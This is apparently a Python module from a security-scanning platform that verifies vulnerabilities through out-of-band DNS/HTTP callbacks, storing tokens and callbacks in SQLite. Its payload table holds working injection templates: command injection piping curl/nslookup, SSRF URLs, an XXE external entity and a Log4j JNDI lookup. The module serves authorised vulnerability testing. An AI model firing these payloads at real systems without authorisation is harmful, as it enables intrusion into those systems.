"""OOB（带外）回执监听。

为什么必须有 OOB：Java 原生反序列化 RCE 的 payload 是**二进制序列化对象**，
平台的 canary 是字符串，进不了 readObject 的实参（结构性限制，见
``src.iast.deserialization_chain``）。第三层用「链路符合性」绕过了这一点，
但它证的是「反序列化发生了且触发了命令执行 sink」。

要证「payload 真的被执行」，唯一可靠的跨网络回执就是带外：让 payload 里带上一个
平台可控的唯一域名，服务端一旦执行，就会产生一次 DNS 查询回到我们的域名。

本模块只负责三件事，**不负责部署 DNS 服务**：
1. 生成不可预测的唯一 token 与完整域名；
2. 记录回调（回调接入方——DNS 服务 / HTTP 回调端点 / 手工录入——调用 record_callback）；
3. 在超时窗口内等待并判定是否收到回调。

回调来源的真实部署形态（二选一，本模块都兼容）：
- 部署一个权威 DNS 服务（如自建 dnschef / 云 DNS 日志），把查询日志写进本表；
- 简易形态：payload 用 HTTP 出网（curl http://<token>.<base>/），由任意 HTTP 服务
  收到请求后调 record_callback。

铁律：**无回调即无证据**。等待超时一律返回 False，绝不把「没收到」包装成「收到了」。
"""
from __future__ import annotations

import logging
import os
import secrets
import sqlite3
import time
from pathlib import Path
from typing import Any, Dict, List, Optional

logger = logging.getLogger(__name__)

DEFAULT_BASE_DOMAIN = os.environ.get("SAST_AI_OOB_BASE_DOMAIN", "")
DEFAULT_DB = os.environ.get("SAST_AI_DB_PATH", "data/app.db")

_TABLE = "oob_callbacks"

_DDL = f"""
CREATE TABLE IF NOT EXISTS {_TABLE} (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    token TEXT NOT NULL,
    task_id INTEGER,
    family TEXT,
    target_endpoint TEXT,
    kind TEXT,
    source TEXT,
    detail TEXT,
    spec_id INTEGER,
    created_at TEXT DEFAULT (datetime('now'))
)
"""


def _connect(db_path: Optional[str] = None) -> sqlite3.Connection:
    path = db_path or DEFAULT_DB
    if path != ":memory:":
        Path(path).parent.mkdir(parents=True, exist_ok=True)
    con = sqlite3.connect(path, timeout=15)
    con.execute(_DDL)
    con.execute(f"CREATE INDEX IF NOT EXISTS idx_{_TABLE}_token ON {_TABLE}(token)")
    try:
        con.execute(f"ALTER TABLE {_TABLE} ADD COLUMN spec_id INTEGER")
    except Exception:
        pass
    return con


def new_token(nbytes: int = 8) -> str:
    """生成不可预测的短 token（纯十六进制，能安全嵌进域名与命令）。"""
    return secrets.token_hex(nbytes)


def oob_domain(token: str, base_domain: str = "") -> str:
    """拼出完整的带外域名 ``<token>.<base>``。未配置 base 时返回空串（表示 OOB 不可用）。"""
    base = (base_domain or DEFAULT_BASE_DOMAIN or "").strip().strip(".")
    if not base or not token:
        return ""
    return f"{token}.{base}"


def oob_enabled() -> bool:
    return bool(DEFAULT_BASE_DOMAIN)


# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
# 两个断口（都是「代码写了但没接上」，不是设计问题）：
#   断口一：DNS 形态依赖 SAST_AI_OOB_BASE_DOMAIN，用户尚未配置公网域名 ⇒ 只有 DNS
#           一条路时 OOB 恒不可用，整条通道是死的。
#   断口二：HTTP 形态的回执端点在后端 ``/api/oob/{token}``（端口 8000），而
#           i2_feedback._OOB_HOST 默认写死 ``127.0.0.1:8088`` —— 端口对不上，
#           就算靶场真的出网了，请求也打到没有监听的端口，回执永远为零。
#           更隐蔽的是它**看起来在工作**：payload 生成了、投出去了、就是没人接。
#
# 修法（定稿推荐丙：两层并存，先把本机 HTTP 端到端跑通，公网 DNS 后配）：
#   - DNS 形态继续用 oob_domain，未配域名即不可用（不硬凑）；
#   - HTTP 形态用 oob_http_url，默认指后端自己的 /api/oob 端点，开箱即可端到端；
#   - oob_mode / oob_status 把「哪条路通」显式暴露出来，别让调用方猜。
# ---------------------------------------------------------------------------

# HTTP 回执端点所在主机。默认指向平台后端自身（8000），因为收数路由就挂在
# src/api/routers/oob.py，前缀 /api/oob。靶场出网打回来即可，无需任何外部部署。
DEFAULT_HTTP_HOST = os.environ.get("SAST_AI_OOB_HTTP_HOST", "127.0.0.1:8000")
OOB_HTTP_PATH = os.environ.get("SAST_AI_OOB_HTTP_PATH", "/api/oob")


def oob_http_url(token: str, host: str = "") -> str:
    """拼出 HTTP 形态的带外回调 URL：``http://<host>/api/oob/<token>``。

    host 为空时取 SAST_AI_OOB_HTTP_HOST，缺省 127.0.0.1:8000（平台后端自身）。
    这与 ``src/api/routers/oob.py`` 的 catch-all 路由一一对应 —— 修的就是它俩
    原先对不上的那个口子。
    """
    if not token:
        return ""
    _host = (host or DEFAULT_HTTP_HOST or "").strip().rstrip("/")
    if not _host:
        return ""
    if not _host.startswith(("http://", "https://")):
        _host = "http://" + _host
    return f"{_host}{OOB_HTTP_PATH}/{token}"


def oob_mode() -> str:
    """当前可用的带外形态：both / dns / http / disabled。

    http 几乎恒可用（平台自己就是接收端），dns 需要用户配公网域名。
    """
    dns = bool((DEFAULT_BASE_DOMAIN or "").strip())
    http = bool((DEFAULT_HTTP_HOST or "").strip())
    if dns and http:
        return "both"
    if dns:
        return "dns"
    if http:
        return "http"
    return "disabled"


def oob_status(db_path: Optional[str] = None) -> Dict[str, Any]:
    """带外通道自检（供运维面板 / 提交前预检 / 排查「回执为零」用）。

    返回各形态的可用性与配置来源，**不因为不可用就报错** —— 带外是增强通道，
    不可用时应由调用方降级到别的证据通道，而不是让扫描失败。
    """
    try:
        from src.core.runtime_facts import probe_egress
        egress = probe_egress()
    except Exception:
        egress = "unknown"
    registered = callbacks = 0
    try:
        con = _connect(db_path)
        registered = int(con.execute(
            f"SELECT COUNT(*) FROM {_TABLE} WHERE kind='registered'").fetchone()[0] or 0)
        callbacks = int(con.execute(
            f"SELECT COUNT(*) FROM {_TABLE} WHERE kind='callback'").fetchone()[0] or 0)
        con.close()
    except Exception as exc:
        logger.debug("[oob] 自检统计失败（忽略）：%s", exc)
    return {
        "mode": oob_mode(),
        "dns_base_domain": DEFAULT_BASE_DOMAIN,
        "http_host": DEFAULT_HTTP_HOST,
        "http_endpoint": f"{OOB_HTTP_PATH}/{{token}}",
        "egress": egress,
        "registered_total": registered,
        "callback_total": callbacks,
        # 只有「平台侧能出网」时带外才有意义；egress=none 意味着即使域名配了，
        # 回执也回不来。
        "ready": oob_mode() != "disabled",
    }


# 各族带外弹形态（M3 第二部分）。
# 判定标准很硬：只有**服务端会主动发起网络请求**的族才配 OOB 弹。投给一个根本
# 不会出网的族，得到的只是「投了但没回」，既浪费一次重放预算，又会把真阴性
# 伪装成「带外也没打通」的假阴性。
#   - command_execution：命令真的执行 ⇒ curl/nslookup 必然出网。最强。
#   - ssrf / xxe / log4j(jndi) / deserialization(jndi)：漏洞语义本身就是 outbound。
#   - sqli：MSSQL/PG 有出网函数（xp_dirtree / dblink），但 MySQL 只能靠
#     LOAD_FILE+UNC 或 UDF，**需要额外前提**；定稿已定 SQLi 优先时间盲注，
#     故这里不排默认弹，避免抢掉那 5 次重放预算。
#   - xss：OOB 依赖浏览器上下文执行 JS，headless 重放不触发 ⇒ 明确不投（历史坑）。
#   - ldap_injection / xpathi：服务端连的是 LDAP/目录，不是 HTTP；我们的回执端
#     点是 HTTP，接不到 ⇒ 用语义差分（M5），不投 OOB。
_OOB_MORPHOLOGY: Dict[str, Dict[str, str]] = {
    "command_execution": {
        "http": "{base}; curl -s {url}",
        "dns": "{base}; nslookup {domain}",
    },
    "ssrf": {
        "http": "{url}",
        "dns": "http://{domain}",
    },
    "xxe": {
        "http": '<!ENTITY xxe SYSTEM "{url}">',
        "dns": '<!ENTITY xxe SYSTEM "http://{domain}">',
    },
    # JNDI 系列**只有 DNS 形态**，别造 HTTP 形态：``${jndi:ldap://host/a}`` 触发的是
    # JVM 对 host 的 DNS 解析 + LDAP 握手，而我们的回执端点是 HTTP 服务、不监听 LDAP，
    # 写 ``ldap://127.0.0.1:8000/a`` 只会连上一个不懂 LDAP 的端口，产生不了任何回执
    # —— 看着像投出去了，实则零信息。DNS 查询则**必然发生**（解析先于连接），
    # 这才是 JNDI 带外唯一可靠的观测点，也因此它在公网域名配好前确实不可用。
    # （另注：模板里 ${{...}} 的双花括号是必须的 — JNDI 表达式自带 ``${``，
    #   写单括号会被 str.format 当成字段名，KeyError: 'jndi'。）
    "jndi_injection": {
        "dns": "${{jndi:ldap://{domain}/a}}",
    },
    "log4j": {
        "dns": "${{jndi:ldap://{domain}/a}}",
    },
    "deserialization": {"http": "{url}", "dns": "http://{domain}"},
}


def payload_for_family(family: str, base: str = "", token: str = "") -> Dict[str, str]:
    """生成某族的带外弹（按当前可用形态给；都不可用返回空 dict）。

    调用方拿到的是 {形态: payload}，自己决定投哪个；本函数**不替调用方决定**
    会不会出网、该不该投 —— 那是重放策略层的事。
    """
    fam = str(family or "").lower().replace("-", "_")
    morph = _OOB_MORPHOLOGY.get(fam)
    if not morph or not token:
        return {}
    out: Dict[str, str] = {}
    mode = oob_mode()
    domain = oob_domain(token)
    url = oob_http_url(token)
    host_noscheme = (DEFAULT_HTTP_HOST or "").strip()
    for k in ("http", "dns"):
        tpl = morph.get(k)
        if not tpl:
            continue
        if k == "http" and mode in ("http", "both") and url:
            out["http"] = tpl.format(base=base, url=url, domain=domain or host_noscheme,
                                     host_noscheme=host_noscheme)
        elif k == "dns" and mode in ("dns", "both") and domain:
            out["dns"] = tpl.format(base=base, url=url, domain=domain,
                                    host_noscheme=host_noscheme)
    return out


def register(
    token: str,
    task_id: Optional[int] = None,
    family: str = "",
    target_endpoint: str = "",
    spec_id: Optional[int] = None,
    db_path: Optional[str] = None,
) -> bool:
    """登记一次待回执的 OOB 投递（占位行，kind='registered'）。

    而不是只能靠 (task_id, family, endpoint) 粗匹配。
    """
    if not token:
        return False
    try:
        con = _connect(db_path)
        con.execute(
            f"INSERT INTO {_TABLE} (token, task_id, family, target_endpoint, kind, detail, spec_id)"
            " VALUES (?,?,?,?,?,?,?)",
            (token, task_id, family, target_endpoint, "registered", "", spec_id),
        )
        con.commit()
        con.close()
        return True
    except Exception as exc:
        logger.warning("[oob] 登记失败（token=%s）：%s", token, exc)
        return False


def record_callback(
    token: str,
    source: str = "",
    detail: str = "",
    db_path: Optional[str] = None,
) -> bool:
    """回调接入方调用：记录一次真实收到的带外请求。

    使回调可按 task 查询、且能精确对号到 spec，而不是只有 token 一个字段。
    """
    if not token:
        return False
    try:
        con = _connect(db_path)
        reg = con.execute(
            f"SELECT task_id, family, target_endpoint, spec_id FROM {_TABLE} "
            "WHERE token=? AND kind='registered' ORDER BY id DESC LIMIT 1",
            (token,),
        ).fetchone()
        _task_id = reg[0] if reg else None
        _family = reg[1] if reg else None
        _ep = reg[2] if reg else None
        _spec_id = reg[3] if reg else None
        con.execute(
            f"INSERT INTO {_TABLE} (token, kind, source, detail, task_id, family, "
            f"target_endpoint, spec_id) VALUES (?,?,?,?,?,?,?,?)",
            (token, "callback", source, (detail or "")[:1000],
             _task_id, _family, _ep, _spec_id),
        )
        con.commit()
        con.close()
        logger.warning("[oob] 收到带外回调 token=%s source=%s", token, source)
        return True
    except Exception as exc:
        logger.warning("[oob] 回调落库失败（token=%s）：%s", token, exc)
        return False


def has_callback(token: str, db_path: Optional[str] = None) -> bool:
    """该 token 是否已收到回调。"""
    if not token:
        return False
    try:
        con = _connect(db_path)
        row = con.execute(
            f"SELECT COUNT(*) FROM {_TABLE} WHERE token=? AND kind='callback'", (token,)
        ).fetchone()
        con.close()
        return int(row[0] if row else 0) > 0
    except Exception as exc:
        logger.warning("[oob] 查询回调失败（token=%s）：%s", token, exc)
        return False


def wait_for_callback(
    token: str,
    timeout: float = 30.0,
    interval: float = 2.0,
    db_path: Optional[str] = None,
) -> Dict[str, Any]:
    """在超时窗口内轮询等待回调。

    返回 {confirmed, waited_seconds, timed_out}。**超时一律 confirmed=False**，
    绝不做「可能收到了」的推断——这正是本模块存在的意义。
    """
    start = time.time()
    deadline = start + max(0.0, float(timeout))
    waited = 0.0
    while True:
        if has_callback(token, db_path=db_path):
            waited = time.time() - start
            return {"confirmed": True, "waited_seconds": round(waited, 2), "timed_out": False}
        if time.time() >= deadline:
            waited = time.time() - start
            return {"confirmed": False, "waited_seconds": round(waited, 2), "timed_out": True}
        time.sleep(max(0.2, float(interval)))


def recent_callbacks(limit: int = 50, db_path: Optional[str] = None) -> List[Dict[str, Any]]:
    """列出最近的回调（便于人工核对与报告举证）。"""
    try:
        con = _connect(db_path)
        con.row_factory = sqlite3.Row
        rows = con.execute(
            f"SELECT * FROM {_TABLE} WHERE kind='callback' ORDER BY id DESC LIMIT ?",
            (int(limit),),
        ).fetchall()
        con.close()
        return [dict(r) for r in rows]
    except Exception as exc:
        logger.warning("[oob] 列出回调失败：%s", exc)
        return []
